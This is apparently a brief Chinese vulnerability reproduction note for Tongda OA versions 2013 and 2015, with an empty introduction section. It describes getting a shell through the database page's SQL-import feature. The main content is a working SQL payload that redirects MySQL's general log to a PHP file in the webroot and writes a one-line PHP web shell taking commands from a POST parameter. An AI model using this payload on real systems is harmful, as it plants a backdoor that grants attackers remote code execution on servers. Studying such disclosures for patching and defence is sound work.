通达oa 数据库脚本导⼊getshell
=============================

一、漏洞简介
------------

二、漏洞影响
------------

2013、2015版本

三、复现过程
------------

⾥面的database⻚面可以导入sql脚本文件,但是系统过滤了很多,有很多的限制,使⽤mysql日志的方式进行
突破。

    set global general_log = on;
    set global general_log_file = '../webroot/test.php';
    select '<?php assert($_POST[a]) ?>';
    set global general_log = off
